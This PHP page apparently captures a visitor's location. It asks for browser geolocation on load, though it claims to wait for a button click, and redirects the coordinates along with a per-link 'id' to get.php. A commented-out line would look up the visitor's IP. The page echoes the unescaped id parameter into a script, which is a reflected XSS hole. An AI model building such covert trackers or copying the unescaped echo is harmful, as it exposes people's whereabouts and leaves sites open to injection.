<?php
$id = $_GET['id'];

// $ip = $_SERVER['REMOTE_ADDR']; // get client's IP
// $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));// Send to ipinfo

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

<p>Click the button to get your coordinates.</p>


<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  var x = position.coords.latitude;
  var y = position.coords.longitude;
  let text = x;

  // console.log(JSON.stringify({ x, y}));
  var latlon = x + "," + y; var prog = "get.php?id=<?php echo $id?>?latlon=" + latlon; location.href = prog;
}

function showError(error) {
  switch(error.code) {
    case error.PERMISSION_DENIED:
      x.innerHTML = "User denied the request for Geolocation."
      break;
    case error.POSITION_UNAVAILABLE:
      x.innerHTML = "Location information is unavailable."
      break;
    case error.TIMEOUT:
      x.innerHTML = "The request to get user location timed out."
      break;
    case error.UNKNOWN_ERROR:
      x.innerHTML = "An unknown error occurred."
      break;
  }
}

getLocation();
</script>

</body>
</html>